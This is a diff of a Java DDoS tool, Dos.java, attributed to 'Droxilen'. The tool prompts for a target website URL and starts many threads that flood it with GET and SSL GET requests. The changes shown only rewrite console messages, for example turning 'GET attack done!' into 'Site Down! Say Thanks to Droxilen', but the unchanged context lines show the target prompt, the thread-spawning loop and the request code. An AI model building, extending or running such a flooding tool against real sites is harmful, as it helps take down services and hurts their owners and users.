@@ -52,7 +52,7 @@ public class Dos implements Runnable {
         int attakingAmoun = 0;
         Dos dos = new Dos(0, 0);
         Scanner in = new Scanner(System.in);
-        System.out.print("Welcome to DDOS by Droxilen, Input you target website url: ");
+        System.out.print("Welcome to DDoS by Droxilen, Input you target website url: ");
         url = in.nextLine();
         System.out.println("\n");
         System.out.println("Targeted URL: " + url);
@@ -97,7 +97,7 @@ public class Dos implements Runnable {
         Thread.sleep(2000);
 
 
-        System.out.println("Starting DDOS");
+        System.out.println("Starting DDoS");
         ArrayList<Thread> threads = new ArrayList<Thread>();
         for (int i = 0; i < Dos.amount; i++) {
             Thread t = new Thread(new Dos(i, ioption));
@@ -185,7 +185,7 @@ public class Dos implements Runnable {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("GET attack done!:" + responseCode + "Thread: " + this.seq);
+        System.out.println("Site Down! Say Thanks to Droxilen:" + responseCode + "Thread: " + this.seq);
     }
 
     private void sslGetAttack(String url) throws Exception {
@@ -195,6 +195,6 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
+        System.out.println("Site Down! Say Thanks to Droxilen: " + responseCode + "Thread: " + this.seq);
     }
 }
